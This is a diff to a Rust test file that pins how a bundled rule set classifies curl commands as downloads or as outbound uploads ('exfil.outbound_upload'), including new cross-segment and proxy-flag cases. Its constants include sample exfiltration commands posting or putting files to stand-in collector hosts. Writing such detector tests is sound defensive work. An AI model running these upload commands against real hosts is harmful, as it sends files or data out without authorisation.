@@ -1,7 +1,7 @@
 //! Tests pinning HTTP direction in the bundled rules: downloads, uploads and
 //! encoded transfers each match only their own direction.
 
-use super::{CompiledRuleSet, MatchResult, load_default_rule_set};
+use super::{load_default_rule_set, CompiledRuleSet, MatchResult};
 
 const BENIGN_ENCODED_API: &str = "curl --data AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA https://api.example.invalid/test";
 const MALICIOUS_ENCODED_HOST: &str =
@@ -33,7 +33,13 @@ const UPLOAD_FILE: &str =
 const EXPLICIT_PUT: &str = "curl -X PUT synthetic.bin https://collector.example.invalid/upload";
 const REQUEST_PUT: &str = "curl --request PUT https://collector.example.invalid/upload";
 const METHOD_POST: &str = "curl --method=post https://collector.example.invalid/upload";
-const TAB_SEPARATED_POST: &str = "curl -x\tpost https://collector.example.invalid/upload";
+const TAB_SEPARATED_POST: &str = "curl -X\tpost https://collector.example.invalid/upload";
+const CROSS_SEGMENT_PUT: &str = "curl https://203.0.113.10/; PUT body";
+const CROSS_SEGMENT_DATA: &str = "curl https://203.0.113.10/ | something -d @file";
+const SAME_SEGMENT_PUT: &str = "curl -X PUT https://203.0.113.10/upload";
+const SAME_SEGMENT_DATA: &str = "curl -d @file https://203.0.113.10/upload";
+const DUMP_HEADER_FILE: &str = "curl -D headers https://203.0.113.10/file";
+const PROXY_NOT_METHOD: &str = "curl -x http://203.0.113.10:8080 https://203.0.113.9/file";
 
 fn bundled() -> CompiledRuleSet {
     load_default_rule_set().expect("bundled rules")
@@ -327,5 +333,42 @@ fn upload_file_and_explicit_methods_are_upload_not_download() {
         let result = evaluate(&[("arguments", command)]).expect("match");
         assert!(has_rule(&result, "exfil.outbound_upload"), "{command}");
         assert!(!has_rule(&result, "network.download"), "{command}");
+    }
+}
+
+#[test]
+fn http_flags_match_only_in_the_client_segment() {
+    for command in [
+        CROSS_SEGMENT_PUT,
+        CROSS_SEGMENT_DATA,
+        DUMP_HEADER_FILE,
+        PROXY_NOT_METHOD,
+    ] {
+        let result = evaluate(&[("arguments", command)]).expect("match");
+        assert!(
+            has_rule(&result, "network.download"),
+            "{command} should remain a download: {:?}",
+            ids(&result)
+        );
+        assert!(
+            !has_rule(&result, "exfil.outbound_upload"),
+            "{command} is not same-segment exfil: {:?}",
+            ids(&result)
+        );
+        assert_eq!(result.score, 20, "{command}");
+    }
+    for command in [SAME_SEGMENT_PUT, SAME_SEGMENT_DATA] {
+        let result = evaluate(&[("arguments", command)]).expect("match");
+        assert!(
+            has_rule(&result, "exfil.outbound_upload"),
+            "{command} should be exfil: {:?}",
+            ids(&result)
+        );
+        assert!(
+            !has_rule(&result, "network.download"),
+            "{command} is not a download: {:?}",
+            ids(&result)
+        );
+        assert_eq!(result.score, 60, "{command}");
     }
 }
